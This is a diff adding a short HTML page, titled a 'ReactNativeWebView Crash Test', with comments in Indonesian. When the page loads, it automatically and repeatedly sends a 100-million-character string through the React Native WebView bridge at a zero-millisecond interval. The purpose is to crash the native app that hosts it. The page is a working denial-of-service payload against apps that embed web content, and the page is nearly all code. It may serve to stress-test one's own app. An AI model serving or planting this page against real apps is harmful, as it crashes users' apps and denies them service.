@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ReactNativeWebView Crash Test</title>
+<style>
+body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
+pre { background: #000; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
+</style>
+</head>
+<body>
+
+<h2>ReactNativeWebView Crash Test</h2>
+<b>Auto Stress Test</b>
+
+<pre id="log"></pre>
+
+<script>
+const log = msg => document.getElementById("log").textContent += "\n" + msg;
+
+function post(msg) {
+    try {
+        if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+            window.ReactNativeWebView.postMessage(msg);
+            log("Sent: " + (msg.length > 100 ? msg.slice(0,100) + "..." : msg));
+        } else {
+            log("ReactNativeWebView not detected.");
+        }
+    } catch (e) {
+        log("Error: " + e.message);
+    }
+}
+
+function sendLongString() {
+    const payload = "A".repeat(100_000_000); // 100 juta karakter
+    post(payload);
+}
+
+let autoTimer = null;
+
+function startAuto() {
+    const interval = 0; // kirim setiap 0 detik
+    autoTimer = setInterval(sendLongString, interval);
+    log(`Auto Stress Test started: every ${interval} ms`);
+}
+
+function stopAuto() {
+    if (autoTimer) {
+        clearInterval(autoTimer);
+        autoTimer = null;
+        log("Auto Stress Test stopped.");
+    }
+}
+
+// AUTO START saat halaman dimuat
+startAuto();
+</script>
+
+</body>
+</html>
